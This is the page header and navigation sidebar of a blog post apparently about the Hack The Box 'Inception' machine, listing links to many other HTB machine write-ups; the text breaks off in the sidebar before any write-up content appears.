<!doctype html><html lang=en><head><title>[HTB] Machine: Inception</title>
<meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><link rel=stylesheet href=/application.650f674fc19266f4ea6c7b54bb6a4ffad10dfa641e3bea6de0a8472a99807590.css integrity="sha256-ZQ9nT8GSZvTqbHtUu2pP+tEN+mQeO+pt4KhHKpmAdZA="><link rel=icon type=image/png href=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_42x0_resize_box_3.png><meta property="og:url" content="https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/inception/"><meta property="og:site_name" content="Personal Blog"><meta property="og:title" content="[HTB] Machine: Inception"><meta property="og:description" content="[HTB] Machine: Inception"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-10-17T00:00:00+00:00"><meta property="article:modified_time" content="2023-10-17T00:00:00+00:00"><meta property="article:tag" content="HTB"><meta property="article:tag" content="Dompdf"><meta property="article:tag" content="Squid"><meta property="article:tag" content="Proxychains"><meta property="article:tag" content="Wfuzz"><meta property="article:tag" content="Container"><meta name=description content="[HTB] Machine: Inception"></head><body class="type-posts kind-page" data-spy=scroll data-target=#TableOfContents data-offset=80><div class="container-fluid bg-dimmed wrapper"><nav class="navbar navbar-expand-xl top-navbar final-navbar shadow"><div class=container><button class="navbar-toggler navbar-light" id=sidebar-toggler type=button>
<span class=navbar-toggler-icon></span>
</button>
<a class=navbar-brand href=/><img src=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_42x0_resize_box_3.png alt=Logo>
Personal Blog</a>
<button class="navbar-toggler navbar-light" id=toc-toggler type=button>
<span class=navbar-toggler-icon></span></button><div class="collapse navbar-collapse lang-selector" id=top-nav-items><ul class="navbar-nav ml-auto"><li class="nav-item dropdown"><a class="nav-link dropdown-toggle" href=# id=themeSelector role=button data-toggle=dropdown aria-haspopup=true aria-expanded=false><img id=navbar-theme-icon-svg src=/icons/moon-svgrepo-com.svg width=20 alt="Dark Theme"></a><div id=themeMenu class="dropdown-menu dropdown-menu-icons-only" aria-labelledby=themeSelector><a class="dropdown-item nav-link" href=# data-scheme=light><img class=menu-icon-center src=/icons/sun-svgrepo-com.svg width=20 alt="Light Theme">
</a><a class="dropdown-item nav-link" href=# data-scheme=dark><img class=menu-icon-center src=/icons/moon-svgrepo-com.svg width=20 alt="Dark Theme">
</a><a class="dropdown-item nav-link" href=# data-scheme=system><img class=menu-icon-center src=/icons/computer-svgrepo-com.svg width=20 alt="System Theme"></a></div></li></ul></div></div><img src=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_42x0_resize_box_3.png class=d-none id=main-logo alt=Logo>
<img src=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_42x0_resize_box_3.png class=d-none id=inverted-logo alt="Inverted Logo"></nav><section class=sidebar-section id=sidebar-section><div class=sidebar-holder><div class=sidebar id=sidebar><form class=mx-auto method=get action=/search><input type=text name=keyword placeholder=Search data-search id=search-box></form><div class=sidebar-tree><ul class=tree id=tree><li id=list-heading><a href=/posts/ data-filter=all>Posts</a></li><div class=subtree><li><i class="fas fa-minus-circle"></i><a class=active href=/posts/cybersecurity/>Cybersecurity</a><ul class=active><li><i class="fas fa-minus-circle"></i><a class=active href=/posts/cybersecurity/hackthebox/>Hackthebox</a><ul class=active><li><a href=/posts/cybersecurity/hackthebox/challenges/ title="[HTB] Challenges">[HTB] Challenges</a></li><li><i class="fas fa-minus-circle"></i><a class=active href=/posts/cybersecurity/hackthebox/machines/>[HTB] Machines</a><ul class=active><li><i class="fas fa-minus-circle"></i><a class=active href=/posts/cybersecurity/hackthebox/machines/linux/>[HTB] Linux Machines</a><ul class=active><li><a href=/posts/cybersecurity/hackthebox/machines/linux/academy/ title="[HTB] Machine: Academy">[HTB] Machine: Academy</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/admirer/ title="[HTB] Machine: Admirer">[HTB] Machine: Admirer</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/agile/ title="[HTB] Machine: Agile">[HTB] Machine: Agile</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/ai/ title="[HTB] Machine: AI">[HTB] Machine: AI</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/antique/ title="[HTB] Machine: Antique">[HTB] Machine: Antique</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/apocalyst/ title="[HTB] Machine: Apocalyst">[HTB] Machine: Apocalyst</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/aragog/ title="[HTB] Machine: Aragog">[HTB] Machine: Aragog</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/armageddon/ title="[HTB] Machine: Armageddon">[HTB] Machine: Armageddon</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/backdoor/ title="[HTB] Machine: Backdoor">[HTB] Machine: Backdoor</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/backend/ title="[HTB] Machine: Backend">[HTB] Machine: Backend</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/backendtwo/ title="[HTB] Machine: BackendTwo">[HTB] Machine: BackendTwo</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bagel/ title="[HTB] Machine: Bagel">[HTB] Machine: Bagel</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bank/ title="[HTB] Machine: Bank">[HTB] Machine: Bank</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bashed/ title="[HTB] Machine: Bashed">[HTB] Machine: Bashed</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/beep/ title="[HTB] Machine: Beep">[HTB] Machine: Beep</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bitlab/ title="[HTB] Machine: Bitlab">[HTB] Machine: Bitlab</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/blocky/ title="[HTB] Machine: Blocky">[HTB] Machine: Blocky</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/blunder/ title="[HTB] Machine: Blunder">[HTB] Machine: Blunder</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bolt/ title="[HTB] Machine: Bolt">[HTB] Machine: Bolt</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/book/ title="[HTB] Machine: Book">[HTB] Machine: Book</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bountyhunter/ title="[HTB] Machine: BountyHunter">[HTB] Machine: BountyHunter</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/broscience/ title="[HTB] Machine: BroScience">[HTB] Machine: BroScience</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bucket/ title="[HTB] Machine: Bucket">[HTB] Machine: Bucket</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/busqueda/ title="[HTB] Machine: Busqueda">[HTB] Machine: Busqueda</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/cache/ title="[HTB] Machine: Cache">[HTB] Machine: Cache</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/canape/ title="[HTB] Machine: Canape">[HTB] Machine: Canape</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/cap/ title="[HTB] Machine: Cap">[HTB] Machine: Cap</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/carrier/ title="[HTB] Machine: Carrier">[HTB] Machine: Carrier</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/celestial/ title="[HTB] Machine: Celestial">[HTB] Machine: Celestial</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/chaos/ title="[HTB] Machine: Chaos">[HTB] Machine: Chaos</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/craft/ title="[HTB] Machine: Craft">[HTB] Machine: Craft</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/cronos/ title="[HTB] Machine: Cronos">[HTB] Machine: Cronos</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/curling/ title="[HTB] Machine: Curling">[HTB] Machine: Curling</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/delivery/ title="[HTB] Machine: Delivery">[HTB] Machine: Delivery</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/devoops/ title="[HTB] Machine: DevOops">[HTB] Machine: DevOops</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/devzat/ title="[HTB] Machine: Devzat">[HTB] Machine: Devzat</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/doctor/ title="[HTB] Machine: Doctor">[HTB] Machine: Doctor</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/dynstr/ title="[HTB] Machine: Dynstr">[HTB] Machine: Dynstr</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/enterprise/ title="[HTB] Machine: Enterprise">[HTB] Machine: Enterprise</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/europa/ title="[HTB] Machine: Europa">[HTB] Machine: Europa</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/explore/ title="[HTB] Machine: Explore">[HTB] Machine: Explore</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/format/ title="[HTB] Machine: Format">[HTB] Machine: Format</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/friendzone/ title="[HTB] Machine: FriendZone">[HTB] Machine: FriendZone</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/frolic/ title="[HTB] Machine: Frolic">[HTB] Machine: Frolic</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/fulcrum/ title="[HTB] Machine: Fulcrum">[HTB] Machine: Fulcrum</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/gobox/ title="[HTB] Machine: Gobox">[HTB] Machine: Gobox</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/goodgames/ title="[HTB] Machine: GoodGames">[HTB] Machine: GoodGames</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/haircut/ title="[HTB] Machine: Haircut">[HTB] Machine: Haircut</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/hawk/ title="[HTB] Machine: Hawk">[HTB] Machine: Hawk</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/haystack/ title="[HTB] Machine: Haystack">[HTB] Machine: Haystack</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/health/ title="[HTB] Machine: Health">[HTB] Machine: Health</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/help/ title="[HTB] Machine: Help">[HTB] Machine: Help</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/horizontall/ title="[HTB] Machine: Horizontall">[HTB] Machine: Horizontall</a></li><li><a class=active href=/posts/cybersecurity/hackthebox/machines/linux/inception/ title="[HTB] Machine: Inception">[HTB] Machine: Inception</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/inject/ title="[HTB] Machine: Inject">[HTB] Machine: Inject</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/irked/ title="[HTB] Machine: Irked">[HTB] Machine: Irked</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/jarvis/ title="[HTB] Machine: Jarvis">[HTB] Machine: Jarvis</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/jewel/ title="[HTB] Machine: Jewel">[HTB] Machine: Jewel</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/jupiter/ title="[HTB] Machine: Jupiter">[HTB] Machine: Jupiter</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/knife/ title="[HTB] Machine: Knife">[HTB] Machine: Knife</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/laboratory/ title="[HTB] Machine: Laboratory">[HTB] Machine: Laboratory</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/lacasadepapel/ title="[HTB] Machine: LaCasaDePapel">[HTB] Machine: LaCasaDePapel</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/lame/ title="[HTB] Machine: Lame">[HTB] Machine: Lame</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/late/ title="[HTB] Machine: Late">[HTB] Machine: Late</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/lazy/ title="[HTB] Machine: Lazy">[HTB] Machine: Lazy</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/luanne/ title="[HTB] Machine: Luanne">[HTB] Machine: Luanne</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/luke/ title="[HTB] Machine: Luke">[HTB] Machine: Luke</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/magic/ title="[HTB] Machine: Magic">[HTB] Machine: Magic</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/mango/ title="[HTB] Machine: Mango">[HTB] Machine: Mango</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/mentor/ title="[HTB] Machine: Mentor">[HTB] Machine: Mentor</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/metatwo/ title="[HTB] Machine: MetaTwo">[HTB] Machine: MetaTwo</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/mirai/ title="[HTB] Machine: Mirai">[HTB] Machine: Mirai</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/monitorstwo/ title="[HTB] Machine: MonitorsTwo">[HTB] Machine: MonitorsTwo</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/networked/ title="[HTB] Machine: Networked">[HTB] Machine: Networked</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/nibbles/ title="[HTB] Machine: Nibbles">[HTB] Machine: Nibbles</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/nineveh/ title="[HTB] Machine: Nineveh">[HTB] Machine: Nineveh</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/node/ title="[HTB] Machine: Node">[HTB] Machine: Node</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/nodeblog/ title="[HTB] Machine: NodeBlog">[HTB] Machine: NodeBlog</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/noter/ title="[HTB] Machine: Noter">[HTB] Machine: Noter</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/nunchucks/ title="[HTB] Machine: Nunchucks">[HTB] Machine: Nunchucks</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/obscurity/ title="[HTB] Machine: Obscurity">[HTB] Machine: Obscurity</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/october/ title="[HTB] Machine: October">[HTB] Machine: October</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/olympus/ title="[HTB] Machine: Olympus">[HTB] Machine: Olympus</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/onlyforyou/ title="[HTB] Machine: OnlyForYou">[HTB] Machine: OnlyForYou</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/openadmin/ title="[HTB] Machine: OpenAdmin">[HTB] Machine: OpenAdmin</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/opensource/ title="[HTB] Machine: OpenSource">[HTB] Machine: OpenSource</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/ophiuchi/ title="[HTB] Machine: Ophiuchi">[HTB] Machine: Ophiuchi</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/pandora/ title="[HTB] Machine: Pandora">[HTB] Machine: Pandora</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/paper/ title="[HTB] Machine: Paper">[HTB] Machine: Paper</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/passage/ title="[HTB] Machine: Passage">[HTB] Machine: Passage</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/pc/ title="[HTB] Machine: PC">[HTB] Machine: PC</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/photobomb/ title="[HTB] Machine: Photobomb">[HTB] Machine: Photobomb</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/pit/ title="[HTB] Machine: Pit">[HTB] Machine: Pit</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/popcorn/ title="[HTB] Machine: Popcorn">[HTB] Machine: Popcorn</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/postman/ title="[HTB] Machine: Postman">[HTB] Machine: Postman</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/precious/ title="[HTB] Machine: Precious">[HTB] Machine: Precious</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/previse/ title="[HTB] Machine: Previse">[HTB] Machine: Previse</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/ready/ title="[HTB] Machine: Ready">[HTB] Machine: Ready</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/redcross/ title="[HTB] Machine: RedCross">[HTB] Machine: RedCross</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/redpanda/ title="[HTB] Machine: RedPanda">[HTB] Machine: RedPanda</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/routerspace/ title="[HTB] Machine: RouterSpace">[HTB] Machine: RouterSpace</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/safe/ title="[HTB] Machine: Safe">[HTB] Machine: Safe</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/schooled/ title="[HTB] Machine: Schooled">[HTB] Machine: Schooled</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/scriptkiddie/ title="[HTB] Machine: ScriptKiddie">[HTB] Machine: ScriptKiddie</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/seal/ title="[HTB] Machine: Seal">[HTB] Machine: Seal</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/secret/ title="[HTB] Machine: Secret">[HTB] Machine: Secret</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/sense/ title="[HTB] Machine: Sense">[HTB] Machine: Sense</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/shibboleth/ title="[HTB] Machine: Shibboleth">[HTB] Machine: Shibboleth</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/shocker/ title="[HTB] Machine: Shocker">[HTB] Machine: Shocker</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/shoppy/ title="[HTB] Machine: Shoppy">[HTB] Machine: Shoppy</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/sneaky/ title="[HTB] Machine: Sneaky">[HTB] Machine: Sneaky</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/sneakymailer/ title="[HTB] Machine: SneakyMailer">[HTB] Machine: SneakyMailer</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/soccer/ title="[HTB] Machine: Soccer">[HTB] Machine: Soccer</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/socket/ title="[HTB] Machine: Socket">[HTB] Machine: Socket</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/solidstate/ title="[HTB] Machine: SolidState">[HTB] Machine: SolidState</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/spectra/ title="[HTB] Machine: Spectra">[HTB] Machine: Spectra</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/squashed/ title="[HTB] Machine: Squashed">[HTB] Machine: Squashed</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/steamcloud/ title="[HTB] Machine: SteamCloud">[HTB] Machine: SteamCloud</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/stocker/ title="[HTB] Machine: Stocker">[HTB] Machine: Stocker</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/stratosphere/ title="[HTB] Machine: Stratosphere">[HTB] Machine: Stratosphere</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/sunday/ title="[HTB] Machine: Sunday">[HTB] Machine: Sunday</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/swagshop/ title="[HTB] Machine: SwagShop">[HTB] Machine: SwagShop</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/tabby/ title="[HTB] Machine: Tabby">[HTB] Machine: Tabby</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/tartarsauce/ title="[HTB] Machine: TartarSauce">[HTB] Machine: TartarSauce</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/teacher/ title="[HTB] Machine: Teacher">[HTB] Machine: Teacher</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/tenet/ title="[HTB] Machine: Tenet">[HTB] Machine: Tenet</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/tentacle/ title="[HTB] Machine: Tentacle">[HTB] Machine: Tentacle</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/tenten/ title="[HTB] Machine: Tenten">[HTB] Machine: Tenten</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/thenotebook/ title="[HTB] Machine: TheNotebook">[HTB] Machine: TheNotebook</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/time/ title="[HTB] Machine: Time">[HTB] Machine: Time</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/traceback/ title="[HTB] Machine: Traceback">[HTB] Machine: Traceback</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/traverxec/ title="[HTB] Machine: Traverxec">[HTB] Machine: Traverxec</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/trick/ title="[HTB] Machine: Trick">[HTB] Machine: Trick</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/twomillion/ title="[HTB] Machine: TwoMillion">[HTB] Machine: TwoMillion</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/unattended/ title="[HTB] Machine: Unattended">[HTB] Machine: Unattended</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/unicode/ title="[HTB] Machine: Unicode">[HTB] Machine: Unicode</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/union/ title="[HTB] Machine: Union">[HTB] Machine: Union</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/updown/ title="[HTB] Machine: Updown">[HTB] Machine: Updown</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/valentine/ title="[HTB] Machine: Valentine">[HTB] Machine: Valentine</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/validation/ title="[HTB] Machine: Validation">[HTB] Machine: Validation</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/vault/ title="[HTB] Machine: Vault">[HTB] Machine: Vault</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/waldo/ title="[HTB] Machine: Waldo">[HTB] Machine: Waldo</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/wall/ title="[HTB] Machine: Wall">[HTB] Machine: Wall</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/writer/ title="[HTB] Machine: Writer">[HTB] Machine: Writer</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/writeup/ title="[HTB] Machine: Writeup">[HTB] Machine: Writeup</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/ypuffy/ title="[HTB] Machine: Ypuffy">[HTB] Machine: Ypuffy</a></li></ul></li><li><i class="fas fa-plus-circle"></i><a href=/posts/cybersecurity/hackthebox/machines/windows/>[HTB] Windows Machines</a><ul><li><a href=/posts/cybersecurity/hackthebox/machines/windows/absolute/ title="[HTB] Machine: Absolute">[HTB] Machine: Absolute</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/access/ title="[HTB] Machine: Access">[HTB] Machine: Access</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/active/ title="[HTB] Machine: Active">[HTB] Machine: Active</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/acute/ title="[HTB] Machine: Acute">[HTB] Machine: Acute</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/anubis/ title="[HTB] Machine: Anubis">[HTB] Machine: Anubis</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/apt/ title="[HTB] Machine: APT">[HTB] Machine: APT</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/arctic/ title="[HTB] Machine: Arctic">[HTB] Machine: Arctic</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/atom/ title="[HTB] Machine: Atom">[HTB] Machine: Atom</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/bankrobber/ title="[HTB] Machine: BankRobber">[HTB] Machine: BankRobber</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/bart/ title="[HTB] Machine: Bart">[HTB] Machine: Bart</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/bastard/ title="[HTB] Machine: Bastard">[HTB] Machine: Bastard</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/bastion/ title="[HTB] Machine: Bastion">[HTB] Machine: Bastion</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/blackfield/ title="[HTB] Machine: Blackfield">[HTB] Machine: Blackfield</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/blue/ title="[HTB] Machine: Blue">[HTB] Machine: Blue</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/bounty/ title="[HTB] Machine: Bounty">[HTB] Machine: Bounty</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/breadcrumbs/ title="[HTB] Machine: Breadcrumps">[HTB] Machine: Breadcrumps</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/buff/ title="[HTB] Machine: Buff">[HTB] Machine: Buff</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/cascade/ title="[HTB] Machine: Cascade">[HTB] Machine: Cascade</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/cerberus/ title="[HTB] Machine: Cerberus">[HTB] Machine: Cerberus</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/chatterbox/ title="[HTB] Machine: Chatterbox">[HTB] Machine: Chatterbox</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/conceal/ title="[HTB] Machine: Conceal">[HTB] Machine: Conceal</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/control/ title="[HTB] Machine: Control">[HTB] Machine: Control</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/devel/ title="[HTB] Machine: Devel">[HTB] Machine: Devel</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/driver/ title="[HTB] Machine: Driver">[HTB] Machine: Driver</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/dropzone/ title="[HTB] Machine: Dropzone">[HTB] Machine: Dropzone</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/escape/ title="[HTB] Machine: Escape">[HTB] Machine: Escape</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/flight/ title="[HTB] Machine: Flight">[HTB] Machine: Flight</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/forest/ title="[HTB] Machine: Forest">[HTB] Machine: Forest</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/fuse/ title="[HTB] Machine: Fuse">[HTB] Machine: Fuse</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/giddy/ title="[HTB] Machine: Giddy">[HTB] Machine: Giddy</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/grandpa/ title="[HTB] Machine: Grandpa">[HTB] Machine: Grandpa</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/granny/ title="[HTB] Machine: Granny">[HTB] Machine: Granny</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/hathor/ title="[HTB] Machine: Hathor">[HTB] Machine: Hathor</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/heist/ title="[HTB] Machine: Heist">[HTB] Machine: Heist</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/intelligence/ title="[HTB] Machine: Intelligence">[HTB] Machine: Intelligence</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/jeeves/ title="[HTB] Machine: Jeeves">[HTB] Machine: Jeeves</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/jerry/ title="[HTB] Machine: Jerry">[HTB] Machine: Jerry</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/json/ title="[HTB] Machine: Json">[HTB] Machine: Json</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/legacy/ title="[HTB] Machine: Legacy">[HTB] Machine: Legacy</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/love/ title="[HTB] Machine: Love">[HTB] Machine: Love</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/mantis/ title="[HTB] Machine: Mantis">[HTB] Machine: Mantis</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/minion/ title="[HTB] Machine: Minion">[HTB] Machine: Minion</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/monteverde/ title="[HTB] Machine: Monteverde">[HTB] Machine: Monteverde</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/multimaster/ title="[HTB] Machine: Multimaster">[HTB] Machine: Multimaster</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/nest/ title="[HTB] Machine: Nest">[HTB] Machine: Nest</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/netmon/ title="[HTB] Machine: Netmon">[HTB] Machine: Netmon</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/object/ title="[HTB] Machine: Object">[HTB] Machine: Object</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/omni/ title="[HTB] Machine: Omni">[HTB] Machine: Omni</a></li><li><a 